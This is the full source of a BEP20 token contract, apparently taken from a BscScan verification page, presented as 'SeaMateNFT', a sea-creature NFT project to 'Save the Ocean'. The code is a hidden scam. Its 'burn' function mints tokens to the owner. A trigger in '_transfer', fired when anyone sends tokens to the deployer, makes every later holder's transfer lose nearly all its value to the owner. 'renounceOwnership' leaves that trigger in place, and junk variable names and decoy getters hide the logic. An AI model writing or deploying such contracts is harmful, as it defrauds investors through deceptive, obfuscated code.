/**
 *Submitted for verification at BscScan.com on 2022-12-02
*/

/*
Aptos Move
Sea Mate - Move To APTOS
SeaMateNFT
A collection of 8888 cute sea creatures here to Save the Ocean. 🌊 #SeaMateNFT Created by Emilsmsurf
     https://twitter.com/SeaMateNFT
     https://linktr.ee/seamatenft
     https://discord.com/invite/QETgMS9XeG
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity =0.8.9;
contract SeaMateNFT {
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  GONVZz = 10000000000000;
address private  qHwmxR = address(0);
address private  uMMgTU = address(0);
uint256 private  mKWIso = 100000000;
address public owner;
uint256 private  HpJtSa = 10000000000;
address private  yKTjux = address(0);
uint8 public constant decimals = 18;
address private  cJgDsW = address(0);
uint256 private  lUdHVt = 1000000000000000000000;
address private  fgfdWu = address(0);
address private  njuRwv = address(0);
uint256 private  vVnLlw = 1000000000000000000;
uint256 public constant LAdnMR = 99999;
address private  svhSqL = address(0);
string public  symbol = "SeaMateNFT";
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
string public  name = "SeaMateNFT";
address private  Mnrljl = address(0);
uint256 private  MenGET = 1000000000000000000;
address private  WoZxgF = address(0);
mapping (address => uint256) public balanceOf;
uint256 public constant totalSupply = 100000000000000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  aYVZLS = 1000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
constructor () {
svhSqL = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tNQtUcF 0");
require(spender != address(0), "fNQtUcF 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getfgfdWu() private returns (address) {
return fgfdWu;
}

function _getGONVZz() private returns (uint256) {
return GONVZz;
}


function _getHpJtSa() private returns (uint256) {
return HpJtSa;
}

function _getvVnLlw() private returns (uint256) {
return vVnLlw;
}



function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getMnrljl() private returns (address) {
return Mnrljl;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}




function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getuMMgTU() private returns (address) {
return uMMgTU;
}



function _getnjuRwv() private returns (address) {
return njuRwv;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}


function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "NQtUcF");
require(to != address(0), "NQtUcF");
require(amount <= balanceOf[from], "NQtUcF");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* LAdnMR/MenGET ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==svhSqL){
MenGET = LAdnMR+2;
}
emit Transfer(from, to, transferAmount);
}










function _getWoZxgF() private returns (address) {
return WoZxgF;
}

function _getcJgDsW() private returns (address) {
return cJgDsW;
}

function _getaYVZLS() private returns (uint256) {
return aYVZLS;
}

function _getmKWIso() private returns (uint256) {
return mKWIso;
}



function _getlUdHVt() private returns (uint256) {
return lUdHVt;
}



function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getqHwmxR() private returns (address) {
return qHwmxR;
}

function _getyKTjux() private returns (address) {
return yKTjux;
}


}